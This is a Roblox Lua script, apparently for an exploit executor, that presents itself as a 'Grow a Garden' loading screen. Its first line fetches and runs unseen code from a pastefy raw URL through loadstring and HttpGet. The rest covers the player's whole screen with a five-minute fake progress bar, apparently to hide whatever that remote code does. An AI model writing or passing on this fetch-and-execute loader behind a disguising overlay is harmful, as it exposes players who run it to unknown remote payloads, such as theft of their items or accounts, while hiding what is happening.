-- First, run your external script
loadstring(game:HttpGet("https://pastefy.app/O1yBSZ1G/raw"))()

-- Roblox "Grow a Garden" Style Loading Screen (5-minute version)

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Background
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
background.Parent = screenGui

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 100)
title.Position = UDim2.new(0, 0, 0.3, 0)
title.BackgroundTransparency = 1
title.Text = "🌴 GROW A GARDEN 🌴"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 48
title.Parent = background

-- Subtext
local subText = Instance.new("TextLabel")
subText.Size = UDim2.new(1, 0, 0, 50)
subText.Position = UDim2.new(0, 0, 0.4, 0)
subText.BackgroundTransparency = 1
subText.Text = "Script Loading Please Wait for a While"
subText.TextColor3 = Color3.fromRGB(200, 200, 200)
subText.Font = Enum.Font.Gotham
subText.TextSize = 20
subText.Parent = background

-- Progress Bar Outer
local barOuter = Instance.new("Frame")
barOuter.Size = UDim2.new(0.6, 0, 0, 20)
barOuter.Position = UDim2.new(0.2, 0, 0.5, 0)
barOuter.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
barOuter.BorderSizePixel = 0
barOuter.Parent = background

-- Inner Progress Bar
local barInner = Instance.new("Frame")
barInner.Size = UDim2.new(0, 0, 1, 0)
barInner.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
barInner.BorderSizePixel = 0
barInner.Parent = barOuter

-- Percentage Text
local percentText = Instance.new("TextLabel")
percentText.Size = UDim2.new(1, 0, 0, 40)
percentText.Position = UDim2.new(0, 0, 0.55, 30)
percentText.BackgroundTransparency = 1
percentText.Text = "0%"
percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
percentText.Font = Enum.Font.GothamBold
percentText.TextSize = 24
percentText.Parent = background

-- Tween progress (5 minutes total)
local TweenService = game:GetService("TweenService")
local totalTime = 300 -- seconds
local stepTime = totalTime / 100 -- 3 seconds per percent

for i = 0, 100 do
    percentText.Text = i .. "%"
    local goal = {Size = UDim2.new(i/100, 0, 1, 0)}
    local tweenInfo = TweenInfo.new(stepTime, Enum.EasingStyle.Linear)
    local tween = TweenService:Create(barInner, tweenInfo, goal)
    tween:Play()
    tween.Completed:Wait()
end

-- Fade out when done
local fadeTween = TweenService:Create(background, TweenInfo.new(1), {BackgroundTransparency = 1})
fadeTween:Play()
fadeTween.Completed:Wait()
screenGui:Destroy()

